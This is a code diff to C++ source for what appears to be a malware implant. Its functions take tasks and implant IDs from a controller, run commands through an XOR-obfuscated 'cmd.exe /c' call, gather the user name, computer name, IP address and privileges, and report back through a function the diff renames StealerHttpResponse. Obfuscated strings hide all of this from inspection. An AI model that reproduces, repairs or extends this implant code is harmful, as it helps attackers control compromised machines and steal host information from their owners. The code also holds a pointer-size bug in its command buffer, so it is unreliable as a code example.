@@ -34,22 +34,27 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     if(command.compare(xor_string("{A\\]I\\AGFIDwi_IZMFM[[",0x28)) == 0){
 
         try{
+            
             json results_parse = GetAll();
+            
+
+
+            /*
             results.append(results_parse.at(xor_string("][MZfIEM",0x28)));
             results.append(results_parse.at(xor_string("KGEXfIEM",0x28)));
-            results.append(results_parse.at(xor_string("AXfIEM",0x28));
+            results.append(results_parse.at(xor_string("AXfIEM",0x28)));
             results.append(results_parse.at(xor_string("xZA^ADMOM[",0x28)));
 
-            /* Formats string so that the endpoint can accept it */
+            // Formats string so that the endpoint can accept it 
             results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
             results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
             std::replace( results.begin(), results.end(), '\\', '/');
             std::replace( results.begin(), results.end(), '-', '_');
-
+            */
 
         }
         catch(...){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            StealerHttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
@@ -155,7 +160,7 @@ std::string exec(char* args){
   
    LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
     + 50);
-    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15), args);
+    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15).c_str(), args);
     HANDLE hStdOutRead, hStdOutWrite;
 
     hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
